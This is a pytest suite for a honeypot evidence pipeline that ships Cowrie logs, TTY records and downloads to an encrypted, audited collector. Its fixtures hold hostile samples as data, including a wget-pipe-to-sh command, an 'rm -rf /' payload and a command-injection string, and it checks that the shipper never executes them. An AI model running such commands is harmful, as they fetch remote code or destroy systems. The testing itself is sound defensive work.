"""Evidence ingestion and storage: spool -> shipper -> collector -> encrypted store."""

import ast
import hashlib
import json
import os
import socket
import sqlite3
import stat
import subprocess
import threading
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from bearjug import wire
from bearjug.collector.server import CollectorServer
from bearjug.collector.store import IngestError, Store, init_data_dir
from bearjug.schema import EvidenceKind, RawEvidence
from bearjug.shipper import Config, ShipError, Shipper

LOGIN = {
    "eventid": "cowrie.login.success",
    "username": "postgres",
    "password": "Synthetic-Decoy-7",
    "session": "a1b2c3d4e5f6",
    "timestamp": "2026-11-18T03:00:00.123456Z",
    "sensor": "sensor-1",
}
COMMAND = {
    "eventid": "cowrie.command.input",
    "input": "uname -a; wget http://198.51.100.9/x.sh | sh",
    "session": "a1b2c3d4e5f6",
    "timestamp": "2026-11-18T03:00:05.000001Z",
    "sensor": "sensor-1",
}


def line(obj) -> bytes:
    return json.dumps(obj).encode() + b"\n"


@pytest.fixture
def data_dir(tmp_path):
    d = tmp_path / "collector"
    init_data_dir(d)
    return d


@pytest.fixture
def store(data_dir):
    s = Store(data_dir)
    yield s
    s.close()


@pytest.fixture
def sensor_key(store):
    return store.add_sensor("sensor-1", actor="test")


@pytest.fixture
def server(store, sensor_key):
    srv = CollectorServer(("127.0.0.1", 0), store)
    t = threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True)
    t.start()
    yield srv
    srv.shutdown()
    srv.server_close()


@pytest.fixture
def cowrie(tmp_path):
    """Cowrie's output directories, as mounted read-only into the shipper."""
    root = tmp_path / "cowrie"
    for d in ("log", "tty", "downloads"):
        (root / d).mkdir(parents=True)
    return root


def make_shipper(server, cowrie, tmp_path, key, sensor_id="sensor-1"):
    host, port = server.server_address
    return Shipper(
        Config(
            sensor_id=sensor_id,
            key=key,
            collector_url=f"http://{host}:{port}",
            log_dir=cowrie / "log",
            tty_dir=cowrie / "tty",
            download_dir=cowrie / "downloads",
            state_path=tmp_path / "shipper-state.json",
            dead_letter_dir=tmp_path / "dead-letter",
            insecure_http=True,
        )
    )


def meta_for(body, kind=EvidenceKind.COWRIE_EVENT, sha=None, sensor_id="sensor-1"):
    now = datetime.now(timezone.utc)
    return wire.ShipMeta(
        sensor_id=sensor_id,
        kind=kind,
        sha256=sha or hashlib.sha256(body).hexdigest(),
        observed_at=now,
        sent_at=now,
        size_bytes=len(body),
    )


# --- end to end -------------------------------------------------------------


def test_cowrie_output_reaches_the_store_end_to_end(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN) + line(COMMAND))
    tty = b"\x01\x00binary tty record with a typed password: hunter2\r\n"
    (cowrie / "tty" / ("ab" * 32)).write_bytes(tty)
    payload = b"#!/bin/sh\nrm -rf / --no-preserve-root\n"
    (cowrie / "downloads" / hashlib.sha256(payload).hexdigest()).write_bytes(payload)

    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 4

    rows = {r["kind"]: r for r in store.list()}
    assert len(store.list()) == 4
    assert rows["tty.log"]["sensitive"] and rows["upload"]["sensitive"]
    by_bytes = {store.record(r["evidence_id"]).sha256: store.record(r["evidence_id"]) for r in store.list()}
    login = by_bytes[hashlib.sha256(line(LOGIN)[:-1]).hexdigest()]
    command = by_bytes[hashlib.sha256(line(COMMAND)[:-1]).hexdigest()]
    assert login.sensitive and not command.sensitive
    assert login.session_id == "a1b2c3d4e5f6"
    assert login.observed_at == datetime(2026, 11, 18, 3, 0, 0, 123456, tzinfo=timezone.utc)
    # Records validate against the canonical schema and are always encrypted.
    for r in store.list():
        rec = RawEvidence.model_validate_json(store.record(r["evidence_id"]).model_dump_json())
        assert rec.content.storage == "stored"
        assert rec.content.encryption.algorithm.value == "aes-256-gcm"


def test_plaintext_never_reaches_disk_unencrypted(server, store, data_dir, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN))
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    for path in data_dir.rglob("*"):
        if path.is_file():
            assert b"Synthetic-Decoy-7" not in path.read_bytes(), path


def test_shipping_twice_does_not_duplicate(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN))
    (cowrie / "tty" / ("cd" * 32)).write_bytes(b"tty")
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    # Shipper state lost: everything is resent, nothing is stored twice.
    (tmp_path / "shipper-state.json").unlink()
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert len(store.list()) == 2


def test_shipper_resumes_from_its_offset_and_waits_for_complete_lines(server, store, cowrie, tmp_path, sensor_key):
    log = cowrie / "log" / "cowrie.json"
    log.write_bytes(line(LOGIN) + b'{"eventid": "cowrie.session.cl')  # Cowrie mid-write
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 1
    with log.open("ab") as f:
        f.write(b'osed", "session": "a1b2c3d4e5f6"}\n')
    assert shipper.run_once() == 1
    assert shipper.run_once() == 0
    assert len(store.list()) == 2


def test_rotated_log_is_not_reshipped(server, store, cowrie, tmp_path, sensor_key):
    log = cowrie / "log" / "cowrie.json"
    log.write_bytes(line(LOGIN))
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.run_once()
    log.rename(cowrie / "log" / "cowrie.json.2026-11-18")
    log.write_bytes(line(COMMAND))
    assert shipper.run_once() == 1
    assert len(store.list()) == 2


def test_tty_logs_still_being_written_are_not_shipped(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "tty" / "20261118-030000-abc-0i.log").write_bytes(b"in progress")
    (cowrie / "downloads" / "tmp_0f1e2d").write_bytes(b"partial download")
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 0


# --- authentication ---------------------------------------------------------


def test_wrong_sensor_key_is_refused(server, store, cowrie, tmp_path):
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    with pytest.raises(ShipError, match="401"):
        make_shipper(server, cowrie, tmp_path, os.urandom(32)).run_once()
    assert store.list() == []


def test_a_sensor_cannot_ship_as_another_sensor(server, store, data_dir, cowrie, tmp_path, sensor_key):
    store.add_sensor("sensor-2", actor="test")
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    with pytest.raises(ShipError, match="401"):
        make_shipper(server, cowrie, tmp_path, sensor_key, sensor_id="sensor-2").run_once()
    assert store.list() == []


def _post(server, meta: str, body: bytes, signature: str):
    import urllib.error
    import urllib.request

    host, port = server.server_address
    req = urllib.request.Request(
        f"http://{host}:{port}{wire.PATH}",
        data=body,
        method="POST",
        headers={wire.META_HEADER: meta, wire.SIGNATURE_HEADER: signature},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def test_tampered_body_fails_the_signature(server, store, sensor_key):
    body = line(COMMAND)[:-1]
    meta = wire.encode_meta(meta_for(body))
    sig = wire.sign(sensor_key, meta, body)
    assert _post(server, meta, body.replace(b"uname", b"UNAME"), sig) == 401
    assert _post(server, meta, body, sig) == 201
    assert _post(server, meta, body, sig) == 200  # replay inside the window: duplicate


def test_stale_requests_are_refused(server, store, sensor_key):
    body = line(COMMAND)[:-1]
    old = datetime.now(timezone.utc) - timedelta(hours=1)
    meta = wire.encode_meta(meta_for(body).model_copy(update={"sent_at": old}))
    assert _post(server, meta, body, wire.sign(sensor_key, meta, body)) == 401


def test_collector_has_no_other_routes(server):
    import urllib.error
    import urllib.request

    host, port = server.server_address
    for path in ("/", "/v1/evidence", "/v1/evidence/ev-1"):
        with pytest.raises(urllib.error.HTTPError) as e:
            urllib.request.urlopen(f"http://{host}:{port}{path}")
        assert e.value.code == 404


# --- integrity and classification --------------------------------------------


def test_digest_is_checked_against_the_bytes(store):
    body = line(COMMAND)[:-1]
    with pytest.raises(IngestError, match="sha256 does not match") as e:
        store.ingest(meta_for(body, sha="0" * 64), body)
    assert e.value.status == 422


def test_corrupted_download_is_rejected_and_not_retried(server, store, cowrie, tmp_path, sensor_key):
    # Cowrie named the file after its bytes at capture; the bytes changed since.
    (cowrie / "downloads" / hashlib.sha256(b"original").hexdigest()).write_bytes(b"tampered")
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 0
    assert store.list() == []
    assert len(shipper.state.acked) == 1
    # Not lost: kept in the dead-letter directory with the reason.
    [meta] = (tmp_path / "dead-letter").glob("*.json")
    entry = json.loads(meta.read_text())
    assert "sha256 does not match" in entry["reason"] and entry["bytes_kept"]
    assert meta.with_suffix(".bin").read_bytes() == b"tampered"


@pytest.mark.parametrize("body", [b"not json", b"[1, 2]", b'{"input": "ls"}'])
def test_unclassifiable_cowrie_events_are_rejected(store, body):
    with pytest.raises(IngestError) as e:
        store.ingest(meta_for(body), body)
    assert e.value.status == 422


def test_nested_secret_marks_an_event_sensitive(store):
    body = json.dumps({"eventid": "cowrie.client.custom", "meta": [{"Passwd": "x"}]}).encode()
    _, eid = store.ingest(meta_for(body), body)
    assert store.record(eid).sensitive


def test_oversized_evidence_is_refused(store):
    store.settings.max_evidence_bytes = 10
    body = b"x" * 11
    with pytest.raises(IngestError) as e:
        store.ingest(meta_for(body, kind=EvidenceKind.UPLOAD), body)
    assert e.value.status == 413


# --- encrypted storage, access and audit -------------------------------------


def test_reads_decrypt_and_are_audited(store):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    assert store.read(eid, actor="reuben", reason="triage") == body
    assert [(a["actor"], a["action"]) for a in store.audit_log()] == [("reuben", "read")]


def test_sensitive_reads_need_a_named_reader(store):
    body = line(LOGIN)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    with pytest.raises(PermissionError):
        store.read(eid, actor="someone", reason="curious")
    store.settings.sensitive_readers = ["researcher"]
    assert store.read(eid, actor="researcher", reason="credential study") == body
    assert [a["action"] for a in store.audit_log()] == ["read-denied", "read"]


def test_blob_swapped_between_records_fails_to_decrypt(store):
    a, b = line(COMMAND)[:-1], b'{"eventid": "cowrie.session.closed"}'
    _, ea = store.ingest(meta_for(a), a)
    _, eb = store.ingest(meta_for(b), b)
    store._blob_path(ea).write_bytes(store._blob_path(eb).read_bytes())
    with pytest.raises(Exception):
        store.read(ea, actor="reuben", reason="check")


def test_rotated_keys_still_decrypt_old_evidence(store, data_dir):
    a = line(COMMAND)[:-1]
    _, ea = store.ingest(meta_for(a), a)
    assert store.keyring.rotate() == "ek-2"
    b = b'{"eventid": "cowrie.session.closed"}'
    _, eb = store.ingest(meta_for(b), b)
    assert store.record(ea).content.encryption.key_id == "ek-1"
    assert store.record(eb).content.encryption.key_id == "ek-2"
    reopened = Store(data_dir)
    assert reopened.read(ea, actor="r", reason="x") == a
    assert reopened.read(eb, actor="r", reason="x") == b


def test_key_files_are_private(data_dir, sensor_key):
    for name in ("evidence-keys.json", "sensors.json"):
        assert (data_dir / name).stat().st_mode & 0o077 == 0


def test_records_are_append_only(store, data_dir):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    db = sqlite3.connect(data_dir / "evidence.db", isolation_level=None)
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("UPDATE evidence SET sha256 = ? WHERE evidence_id = ?", ("0" * 64, eid))
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("DELETE FROM evidence")
    store.read(eid, actor="r", reason="x")
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("DELETE FROM audit")


# --- retention and deletion ---------------------------------------------------


def test_retention_purges_sensitive_evidence_sooner(store):
    now = datetime(2026, 11, 18, tzinfo=timezone.utc)
    login, command = line(LOGIN)[:-1], line(COMMAND)[:-1]
    _, e_login = store.ingest(meta_for(login), login, now=now - timedelta(days=31))
    _, e_cmd = store.ingest(meta_for(command), command, now=now - timedelta(days=31))
    assert store.purge(now=now) == [e_login]
    assert not store._blob_path(e_login).exists()
    assert store._blob_path(e_cmd).exists()
    assert store.purge(now=now + timedelta(days=365)) == [e_cmd]
    assert [a["actor"] for a in store.audit_log()] == ["retention", "retention"]


def test_deleted_evidence_keeps_a_tombstone_and_is_not_restored(store):
    body = line(LOGIN)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    store.delete(eid, actor="reuben", reason="test data")
    assert store.record(eid).sha256 == hashlib.sha256(body).hexdigest()
    with pytest.raises(KeyError):
        store.read(eid, actor="reuben", reason="x")
    assert store.ingest(meta_for(body), body) == ("deleted", eid)
    assert not store._blob_path(eid).exists()


def test_delete_needs_a_reason(store):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    with pytest.raises(PermissionError):
        store.delete(eid, actor="reuben", reason=" ")


# --- the shipper boundary (design 2.3) ---------------------------------------


def test_shipper_never_executes_or_interprets_spool_content(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("shipper tried to run something")

    for name in ("system", "popen", "execv", "execve", "execvp", "spawnv"):
        monkeypatch.setattr(os, name, refuse, raising=False)
    monkeypatch.setattr(subprocess, "Popen", refuse)
    monkeypatch.setattr("builtins.eval", refuse)
    monkeypatch.setattr("builtins.exec", refuse)

    hostile = {"eventid": "cowrie.command.input", "input": "$(reboot); `id`; | sh && ' \" \\ %s {0}"}
    (cowrie / "log" / "cowrie.json").write_bytes(line(hostile))
    elf = b"\x7fELF\x02\x01\x01" + os.urandom(64)
    (cowrie / "downloads" / hashlib.sha256(elf).hexdigest()).write_bytes(elf)
    script = cowrie / "downloads" / hashlib.sha256(b"#!/bin/sh\necho pwned\n").hexdigest()
    script.write_bytes(b"#!/bin/sh\necho pwned\n")
    script.chmod(0o755)

    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 3
    store.settings.sensitive_readers = ["r"]
    stored = {store.read(r["evidence_id"], actor="r", reason="x") for r in store.list()}
    assert stored == {line(hostile)[:-1], elf, b"#!/bin/sh\necho pwned\n"}


def test_shipper_does_not_follow_symlinks_out_of_the_spool(server, store, cowrie, tmp_path, sensor_key):
    secret = tmp_path / "shipper-key"
    secret.write_bytes(b"not for the collector")
    (cowrie / "tty" / ("ef" * 32)).symlink_to(secret)
    (cowrie / "log" / "cowrie.json").symlink_to(secret)
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 0
    assert store.list() == []


def test_shipper_never_listens(server, cowrie, tmp_path, sensor_key, monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("shipper opened a listening socket")

    monkeypatch.setattr(socket.socket, "listen", refuse)
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 1


SRC = Path(__file__).resolve().parents[1] / "src" / "bearjug"


def test_collector_has_no_client_code():
    """The collector only answers; nothing in it can open a connection to a
    sensor (the only connect() allowed is SQLite's)."""
    forbidden = {"urllib.request", "http.client", "requests", "httpx", "urllib3", "aiohttp", "asyncio"}
    for path in (SRC / "collector").glob("*.py"):
        for node in ast.walk(ast.parse(path.read_text())):
            if isinstance(node, ast.Import):
                names = {a.name for a in node.names}
                assert not names & forbidden, f"{path.name} imports {names & forbidden}"
            elif isinstance(node, ast.ImportFrom):
                names = {node.module or ""} | {f"{node.module}.{a.name}" for a in node.names}
                assert not names & forbidden, f"{path.name} imports {names & forbidden}"
            elif isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                attr, owner = node.func.attr, node.func.value
                if attr in {"connect", "connect_ex", "create_connection", "socket"}:
                    assert isinstance(owner, ast.Name) and owner.id == "sqlite3", f"{path.name}:{node.lineno} {attr}()"


def test_shipper_requires_tls_unless_told_otherwise(tmp_path, sensor_key):
    with pytest.raises(ValueError, match="https"):
        Shipper(Config(sensor_id="sensor-1", key=sensor_key, collector_url="http://collector", state_path=tmp_path / "s"))


# =============================================================================
# Hardening after review
# =============================================================================

from bearjug.collector import cli  # noqa: E402
from bearjug.collector.store import EvidenceMissing  # noqa: E402


def start_server(store):
    srv = CollectorServer(("127.0.0.1", 0), store)
    threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()
    return srv


def stop_server(srv):
    srv.shutdown()
    srv.server_close()


def raw_request(srv, headers: dict, body: bytes = b"", *, send_body=True, timeout=5.0) -> bytes:
    host, port = srv.server_address
    s = socket.create_connection((host, port), timeout=timeout)
    head = f"POST {wire.PATH} HTTP/1.1\r\nHost: x\r\n" + "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"
    s.sendall(head.encode() + (body if send_body else b""))
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    return data


def signed_headers(key, body, sensor_id="sensor-1", length=None):
    meta = wire.encode_meta(meta_for(body, sensor_id=sensor_id))
    return {
        "Content-Length": str(len(body) if length is None else length),
        wire.META_HEADER: meta,
        wire.SIGNATURE_HEADER: wire.sign(key, meta, body),
    }


# --- 1. unauthenticated resource exhaustion ----------------------------------


def test_connections_over_the_limit_are_closed_at_once(store, sensor_key):
    store.settings.max_concurrent_requests = 2
    srv = start_server(store)
    try:
        host, port = srv.server_address
        held = [socket.create_connection((host, port)) for _ in range(2)]
        time.sleep(0.2)
        extra = socket.create_connection((host, port), timeout=2)
        assert extra.recv(1) == b""  # closed without being served
        for s in held:
            s.close()
        time.sleep(0.2)
        body = line(COMMAND)[:-1]
        assert raw_request(srv, signed_headers(sensor_key, body), body).startswith(b"HTTP/1.0 201")
    finally:
        stop_server(srv)


def test_slow_clients_are_cut_off_at_the_deadline(store):
    store.settings.request_deadline_seconds = 0.5
    srv = start_server(store)
    try:
        host, port = srv.server_address
        s = socket.create_connection((host, port), timeout=5)
        started = time.monotonic()
        closed = False
        for ch in b"POST /v1/evidence HTTP/1.1\r\nHost: x\r\nX-Slow: " + b"a" * 100:
            try:
                s.send(bytes([ch]))
            except OSError:
                closed = True
                break
            time.sleep(0.05)
            if time.monotonic() - started > 3:
                break
        if not closed:
            s.settimeout(3)
            closed = s.recv(1) == b""
        assert closed and time.monotonic() - started < 3
    finally:
        stop_server(srv)


def test_body_is_not_read_for_an_unknown_sensor(server):
    # Claims 30 MB but sends none of it: refused from the headers alone.
    body = b"x"
    headers = signed_headers(os.urandom(32), body, sensor_id="nobody", length=30_000_000)
    headers[wire.META_HEADER] = wire.encode_meta(meta_for(b"x" * 0, sensor_id="nobody").model_copy(update={"size_bytes": 30_000_000}))
    started = time.monotonic()
    assert raw_request(server, headers, send_body=False).startswith(b"HTTP/1.0 401")
    assert time.monotonic() - started < 2


def test_repeated_auth_failures_are_rate_limited(store, sensor_key):
    store.settings.auth_failures_per_minute = 3
    srv = start_server(store)
    try:
        body = line(COMMAND)[:-1]
        for _ in range(3):
            assert raw_request(srv, signed_headers(os.urandom(32), body), body).startswith(b"HTTP/1.0 401")
        # Even a correct request from that address now waits for the bucket to refill.
        assert raw_request(srv, signed_headers(sensor_key, body), body).startswith(b"HTTP/1.0 429")
    finally:
        stop_server(srv)


def test_request_rate_is_limited_per_client(store, sensor_key):
    store.settings.rate_limit_per_second = 0.01
    store.settings.rate_limit_burst = 2
    srv = start_server(store)
    try:
        body = line(COMMAND)[:-1]
        codes = [raw_request(srv, signed_headers(sensor_key, body), body)[9:12] for _ in range(3)]
        assert codes == [b"201", b"200", b"429"]
    finally:
        stop_server(srv)


def test_shipper_backs_off_on_429(store, cowrie, tmp_path, sensor_key):
    store.settings.rate_limit_per_second = 0.01
    store.settings.rate_limit_burst = 1
    srv = start_server(store)
    try:
        (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN) + line(COMMAND))
        shipper = make_shipper(srv, cowrie, tmp_path, sensor_key)
        with pytest.raises(ShipError, match="429"):
            shipper.run_once()
        assert len(store.list()) == 1
        assert not list((tmp_path / "dead-letter").glob("*.json"))  # retried later, not dead-lettered
    finally:
        stop_server(srv)


# --- 2. key rotation takes effect in the running collector --------------------


def test_rotation_by_another_process_applies_to_the_next_upload(server, store, data_dir, sensor_key):
    body1, body2 = line(COMMAND)[:-1], b'{"eventid": "cowrie.session.closed"}'
    assert raw_request(server, signed_headers(sensor_key, body1), body1).startswith(b"HTTP/1.0 201")
    cli_store = Store(data_dir)  # what the CLI opens: a different process in real life
    assert cli_store.rotate_key(actor="reuben") == "ek-2"
    assert raw_request(server, signed_headers(sensor_key, body2), body2).startswith(b"HTTP/1.0 201")
    keys = sorted(store.record(r["evidence_id"]).content.encryption.key_id for r in store.list())
    assert keys == ["ek-1", "ek-2"]
    assert [a["action"] for a in store.audit_log()][-1] == "rotate-evidence-key"


def test_rotate_key_cli_waits_for_the_running_collector_to_confirm(store, data_dir, capsys):
    stop = threading.Event()

    def beat():
        while not stop.is_set():
            store.heartbeat()
            time.sleep(0.1)

    t = threading.Thread(target=beat, daemon=True)
    t.start()
    try:
        assert cli.main(["--data", str(data_dir), "--actor", "reuben", "rotate-key", "--wait", "3"]) == 0
        assert "confirmed it is encrypting with ek-2" in capsys.readouterr().out
        assert cli.main(["--data", str(data_dir), "key-status"]) == 0
    finally:
        stop.set()
        t.join()


def test_rotate_key_cli_says_so_when_no_collector_is_running(data_dir, capsys):
    assert cli.main(["--data", str(data_dir), "rotate-key"]) == 0
    assert "no collector is running" in capsys.readouterr().out


def test_key_status_fails_when_the_collector_uses_an_old_key(store, data_dir):
    store.heartbeat()
    # Simulate a collector that has not picked up the rotation.
    store.db.execute("UPDATE collector_state SET value = 'ek-0' WHERE name = 'encrypting_key_id'")
    assert cli.main(["--data", str(data_dir), "key-status"]) == 1


# --- 3. dead-letter directory -------------------------------------------------


def test_refused_lines_are_dead_lettered_and_the_rest_still_ships(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(b"not json from a new cowrie version\n" + line(COMMAND))
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 1
    assert len(store.list()) == 1
    [meta] = (tmp_path / "dead-letter").glob("*.json")
    entry = json.loads(meta.read_text())
    assert entry["kind"] == "cowrie.event" and "422" in entry["reason"] and "not valid JSON" in entry["reason"]
    assert entry["source"].endswith("cowrie.json@0")
    data = meta.with_suffix(".bin")
    assert data.read_bytes() == b"not json from a new cowrie version"
    assert data.stat().st_mode & 0o777 == 0o600


def test_dead_letter_cap_keeps_metadata_only(server, cowrie, tmp_path, sensor_key):
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.dead_letter.max_bytes = 10
    (cowrie / "log" / "cowrie.json").write_bytes(b"x" * 50 + b"\n")
    shipper.run_once()
    [meta] = (tmp_path / "dead-letter").glob("*.json")
    entry = json.loads(meta.read_text())
    assert not entry["bytes_kept"] and "full" in entry["bytes_not_kept_because"]
    assert not list((tmp_path / "dead-letter").glob("*.bin"))


def test_oversized_files_are_recorded_not_dropped(server, cowrie, tmp_path, sensor_key):
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.config.max_file_bytes = 4
    (cowrie / "tty" / ("12" * 32)).write_bytes(b"too long")
    shipper.run_once()
    [meta] = (tmp_path / "dead-letter").glob("*.json")
    assert "over the 4-byte limit" in json.loads(meta.read_text())["reason"]


def test_dead_letter_entries_expire(server, cowrie, tmp_path, sensor_key):
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    (cowrie / "log" / "cowrie.json").write_bytes(b"bad\n")
    shipper.run_once()
    old = time.time() - 31 * 86400
    for p in (tmp_path / "dead-letter").iterdir():
        os.utime(p, (old, old))
    shipper.run_once()
    assert list((tmp_path / "dead-letter").iterdir()) == []


# --- 4. startup reconciliation and crash recovery ----------------------------


class _CrashOnInsert:
    """Stands in for the SQLite connection and fails the evidence insert, as
    if the collector died right after writing the blob."""

    def __init__(self, real):
        self.real = real

    def execute(self, sql, *args):
        if sql.startswith("INSERT INTO evidence"):
            raise RuntimeError("simulated crash")
        return self.real.execute(sql, *args)

    def __getattr__(self, name):
        return getattr(self.real, name)


def test_crash_after_blob_write_is_recovered(store, data_dir):
    body = line(COMMAND)[:-1]
    real = store.db
    store.db = _CrashOnInsert(real)
    with pytest.raises(RuntimeError):
        store.ingest(meta_for(body), body)
    store.db = real
    assert store.list() == []

    report = Store(data_dir).reconcile()
    assert len(report.orphans_quarantined) == 1 and report.healthy
    assert (data_dir / "orphans" / report.orphans_quarantined[0]).exists()
    # The shipper never got a reply, so it resends; that now stores cleanly.
    assert store.ingest(meta_for(body), body)[0] == "stored"
    assert store.reconcile().healthy


def test_interrupted_temp_writes_are_removed(store, data_dir):
    (data_dir / "blobs" / "ab").mkdir()
    (data_dir / "blobs" / "ab" / "ev-abc.tmp").write_bytes(b"half")
    report = store.reconcile()
    assert report.temp_files_removed == ["ev-abc.tmp"] and report.healthy
    assert not (data_dir / "blobs" / "ab" / "ev-abc.tmp").exists()


def test_missing_blob_is_never_treated_as_healthy(store, data_dir, capsys):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    store._blob_path(eid).unlink()
    report = store.reconcile()
    assert report.missing == [eid] and not report.healthy
    assert store.list()[0]["issue"] == "blob missing"
    with pytest.raises(EvidenceMissing):
        store.read(eid, actor="r", reason="x")
    assert cli.main(["--data", str(data_dir), "check"]) == 1
    assert "MISSING" in capsys.readouterr().out


def test_crash_during_delete_is_completed(store, monkeypatch):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)

    def crash(self, missing_ok=False):
        raise RuntimeError("simulated crash")

    monkeypatch.setattr(Path, "unlink", crash)
    with pytest.raises(RuntimeError):
        store.delete(eid, actor="reuben", reason="test")
    monkeypatch.undo()
    assert store.record(eid) is not None and store._blob_path(eid).exists()
    report = store.reconcile()
    assert report.deletions_completed == [eid] and report.healthy
    assert not store._blob_path(eid).exists()


def test_deep_check_finds_corrupt_blobs(store):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    blob = bytearray(store._blob_path(eid).read_bytes())
    blob[-1] ^= 1
    store._blob_path(eid).write_bytes(bytes(blob))
    assert store.reconcile().healthy  # the shallow check only looks for presence
    report = store.reconcile(deep=True)
    assert report.corrupt == [eid] and not report.healthy


# --- 5. sensor key lifecycle --------------------------------------------------


def test_revoked_sensor_is_refused_without_touching_evidence_keys(server, store, data_dir, cowrie, tmp_path, sensor_key):
    log_file = cowrie / "log" / "cowrie.json"
    log_file.write_bytes(line(LOGIN))
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 1
    keyring_before = (data_dir / "evidence-keys.json").read_bytes()

    Store(data_dir).revoke_sensor("sensor-1", actor="reuben", reason="suspected compromise")
    with log_file.open("ab") as f:
        f.write(line(COMMAND))
    with pytest.raises(ShipError, match="401"):
        shipper.run_once()
    assert len(store.list()) == 1  # evidence already received is kept
    assert (data_dir / "evidence-keys.json").read_bytes() == keyring_before
    assert store.sensors()[0]["status"] == "revoked"


def test_replaced_key_works_and_the_old_one_does_not(server, store, data_dir, sensor_key):
    new_key = Store(data_dir).replace_sensor_key("sensor-1", actor="reuben", reason="scheduled re-key")
    body = line(COMMAND)[:-1]
    assert raw_request(server, signed_headers(sensor_key, body), body).startswith(b"HTTP/1.0 401")
    assert raw_request(server, signed_headers(new_key, body), body).startswith(b"HTTP/1.0 201")


def test_a_revoked_sensor_can_be_reissued_a_key(store):
    store.add_sensor("sensor-9", actor="a")
    store.revoke_sensor("sensor-9", actor="a", reason="test")
    assert store.sensor_key("sensor-9") is None
    key = store.replace_sensor_key("sensor-9", actor="a", reason="rebuilt")
    assert store.sensor_key("sensor-9") == key


def test_last_seen_is_recorded(server, store, cowrie, tmp_path, sensor_key):
    assert store.sensors()[0]["last_seen_at"] is None
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    seen = store.sensors()[0]
    assert seen["last_seen_at"] is not None and seen["last_ip"] == "127.0.0.1"


def test_sensor_lifecycle_is_audited(store):
    store.add_sensor("sensor-2", actor="reuben")
    store.replace_sensor_key("sensor-2", actor="reuben", reason="re-key")
    store.revoke_sensor("sensor-2", actor="reuben", reason="retired")
    actions = [(a["actor"], a["action"]) for a in store.audit_log()]
    assert actions == [
        ("reuben", "sensor-register"),
        ("reuben", "sensor-key-replace"),
        ("reuben", "sensor-revoke"),
    ]


# --- TLS: the hard deadline covers the handshake -------------------------------


@pytest.fixture
def tls_files(tmp_path):
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "localhost")])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(minutes=1))
        .not_valid_after(now + timedelta(days=1))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
        .sign(key, hashes.SHA256())
    )
    cert_path, key_path = tmp_path / "tls.crt", tmp_path / "tls.key"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(
        key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
    )
    return cert_path, key_path


def start_tls_server(store, tls_files):
    from bearjug.collector.server import tls_context

    srv = CollectorServer(("127.0.0.1", 0), store, tls_context(*tls_files))
    threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()
    return srv


def test_slow_tls_handshake_is_cut_off_at_the_deadline(store, tls_files):
